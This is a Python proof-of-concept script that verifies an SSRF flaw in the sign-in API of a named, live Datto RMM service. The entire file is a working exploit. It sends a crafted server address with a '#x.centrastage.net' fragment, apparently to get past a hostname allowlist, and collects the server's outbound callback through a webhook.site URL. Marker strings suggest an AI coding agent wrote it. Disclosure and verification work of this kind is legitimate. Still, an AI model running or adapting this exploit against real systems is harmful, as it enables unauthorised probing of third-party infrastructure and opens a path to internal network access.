#!/usr/bin/env python3
"""Verify Datto RMM sign-in SSRF using a temporary, self-owned Webhook.site URL.

Requires: pip install requests
This script sends only dummy credentials and makes no tenant-registration request.
"""

import sys
import time
import uuid

import requests


TARGET = "https://datto.rmm.bitdefender.com/api/user/signIn"
WEBHOOK_API = "https://webhook.site"


def make_collector(session: requests.Session) -> str:
    response = session.post(
        f"{WEBHOOK_API}/token",
        json={"default_status": 404, "default_content": "Not Found"},
        timeout=15,
    )
    response.raise_for_status()
    return response.json()["uuid"]


def captured_requests(session: requests.Session, token: str) -> list[dict]:
    response = session.get(
        f"{WEBHOOK_API}/token/{token}/requests?sorting=newest",
        timeout=15,
    )
    response.raise_for_status()
    return response.json().get("data", [])


def sign_in(session: requests.Session, url: str, marker: str) -> requests.Response:
    return session.post(
        TARGET,
        json={
            "rmmApiKey": marker,
            "rmmApiSecret": marker,
            "rmmServerAddress": url,
        },
        timeout=20,
        allow_redirects=False,
    )


def main() -> int:
    session = requests.Session()
    token = make_collector(session)
    nonce = uuid.uuid4().hex[:12]
    host = f"{token}.webhook.site"

    baseline_marker = f"codex-control-{nonce}"
    baseline_url = f"https://{host}"
    baseline_response = sign_in(session, baseline_url, baseline_marker)
    print(f"Control: HTTP {baseline_response.status_code} {baseline_response.text[:100]!r}")

    probe_marker = f"codex-ssrf-{nonce}"
    path = f"/poc-{nonce}?marker=datto-ssrf"
    probe_url = f"https://{host}{path}#x.centrastage.net"
    probe_response = sign_in(session, probe_url, probe_marker)
    print(f"Probe:   HTTP {probe_response.status_code} {probe_response.text[:100]!r}")
    print(f"URL:     {probe_url}")

    for _ in range(10):
        hits = captured_requests(session, token)
        probe_hits = [
            hit
            for hit in hits
            if hit.get("method") == "POST"
            and f"/poc-{nonce}" in hit.get("url", "")
            and probe_marker in hit.get("content", "")
        ]
        if probe_hits:
            hit = probe_hits[0]
            print("Verified server-side callback:")
            print(f"  {hit['method']} {hit['url']}")
            print(f"  Source IP: {hit.get('ip')}")
            print(f"  Body: {hit.get('content')}")
            controls = [hit for hit in hits if baseline_marker in hit.get("content", "")]
            print(f"  Control callbacks: {len(controls)}")
            return 0
        time.sleep(1.5)

    print("No callback observed within the polling window.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except requests.RequestException as exc:
        print(f"Network error: {exc}", file=sys.stderr)
        raise SystemExit(2)
